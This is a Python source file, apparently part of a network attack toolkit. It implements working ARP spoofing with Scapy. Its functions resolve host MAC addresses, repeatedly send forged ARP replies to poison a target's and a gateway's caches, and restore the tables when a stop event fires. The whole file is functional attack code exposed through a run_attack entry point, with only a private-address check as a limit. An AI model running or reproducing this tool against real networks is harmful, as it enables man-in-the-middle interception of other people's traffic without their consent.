import sys, os
_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
if _ROOT not in sys.path:
    sys.path.insert(0, _ROOT)

from scapy.all import Ether, ARP, sendp
import re
import ipaddress
import time  
from scapy.all import srp1, conf
conf.verb = 0
from utils.scapy_iface import resolve_iface

_MAC_RE = re.compile(r'^([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}$')

_PRIVATE_NETS = [
    ipaddress.ip_network("10.0.0.0/8"),
    ipaddress.ip_network("172.16.0.0/12"),
    ipaddress.ip_network("192.168.0.0/16"),
]

def _valid_mac(mac: str) -> bool:
    return bool(_MAC_RE.match(mac or ''))

def _valid_ip(ip: str) -> bool:
    try:
        ipaddress.IPv4Address(ip)
        return True
    except Exception:
        return False

def _is_private_ip(ip: str) -> bool:
    try:
        addr = ipaddress.IPv4Address(ip)
        return any(addr in net for net in _PRIVATE_NETS)
    except Exception:
        return False

def _validate(target_ip, target_mac, gateway_ip, gateway_mac) -> str | None:
    """Returns an error string if any argument is invalid, else None."""
    if not _valid_ip(target_ip):
        return f"Invalid target IP: {target_ip}"
    if not _valid_ip(gateway_ip):
        return f"Invalid gateway IP: {gateway_ip}"
    if not _valid_mac(target_mac):
        return f"Invalid target MAC: {target_mac}"
    if not _valid_mac(gateway_mac):
        return f"Invalid gateway MAC: {gateway_mac}"
    if target_ip == gateway_ip:
        return "Target and gateway IP must differ."
    if not _is_private_ip(target_ip):
        return "Target IP must be a private network address."
    if not _is_private_ip(gateway_ip):
        return "Gateway IP must be a private network address."
    return None

def _resolve_mac(ip: str, iface: str, timeout: float = 1.0) -> str:
    """Directed ARP to resolve a host MAC on the chosen interface."""
    try:
        pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
        ans = srp1(pkt, iface=iface, timeout=timeout, verbose=0)
        if ans and ans.haslayer(ARP):
            return ans[ARP].hwsrc
    except Exception:
        pass
    return ""


def spoof(target_ip, target_mac, gateway_ip, gateway_mac, iface: str = ""):
    """Send spoofed ARP replies to both target and gateway."""
    pkt_to_target = Ether(dst=target_mac) / ARP(
        op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
    pkt_to_gateway = Ether(dst=gateway_mac) / ARP(
        op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip)

    sendp(pkt_to_target,  iface=iface or None, verbose=0)
    sendp(pkt_to_gateway, iface=iface or None, verbose=0)

def restore(target_ip, target_mac, gateway_ip, gateway_mac, iface: str = ""):
    """Restore correct ARP tables on both target and gateway."""
    pkt_fix_target = Ether(dst=target_mac) / ARP(
        op=2, pdst=target_ip,  hwdst=target_mac,
        psrc=gateway_ip, hwsrc=gateway_mac)
    pkt_fix_gateway = Ether(dst=gateway_mac) / ARP(
        op=2, pdst=gateway_ip, hwdst=gateway_mac,
        psrc=target_ip,  hwsrc=target_mac)

    for _ in range(5):
        sendp(pkt_fix_target,  iface=iface or None, verbose=0)
        sendp(pkt_fix_gateway, iface=iface or None, verbose=0)
        time.sleep(0.4)

def run_attack(*args, **kwargs) -> str | None:
    """
    Backwards-compatible entry point.

    Supported call signatures:
      - run_attack(target_ip, gateway_ip, iface, stop_event)           (used by main.py)
      - run_attack(target_ip, target_mac, gateway_ip, gateway_mac, stop_event)

    Spoofs until stop_event is set, then always restores.
    Returns an error string if validation fails, else None.
    """
    # Keyword style (future-proof)
    if kwargs and not args:
        target_ip   = kwargs.get("target_ip")
        gateway_ip  = kwargs.get("gateway_ip")
        iface       = kwargs.get("iface", "")
        stop_event  = kwargs.get("stop_event")
        target_mac  = kwargs.get("target_mac", "")
        gateway_mac = kwargs.get("gateway_mac", "")
    else:
        if len(args) == 4:
            target_ip, gateway_ip, iface, stop_event = args
            target_mac, gateway_mac = "", ""
        elif len(args) == 5:
            target_ip, target_mac, gateway_ip, gateway_mac, stop_event = args
            iface = ""
        else:
            return "Invalid arguments to run_attack()."

    if not stop_event:
        return "Missing stop_event."

    # Resolve MACs if not provided.
    iface = resolve_iface(str(iface or ""))
    if not target_mac:
        target_mac = _resolve_mac(str(target_ip), iface=str(iface))
    if not gateway_mac:
        gateway_mac = _resolve_mac(str(gateway_ip), iface=str(iface))

    err = _validate(target_ip, target_mac, gateway_ip, gateway_mac)
    if err:
        return err

    try:
        while not stop_event.is_set():
            spoof(target_ip, target_mac, gateway_ip, gateway_mac, iface=str(iface))
            if stop_event.wait(timeout=2):
                break
    except KeyboardInterrupt:
        stop_event.set()
    finally:
        restore(target_ip, target_mac, gateway_ip, gateway_mac, iface=str(iface))

    return None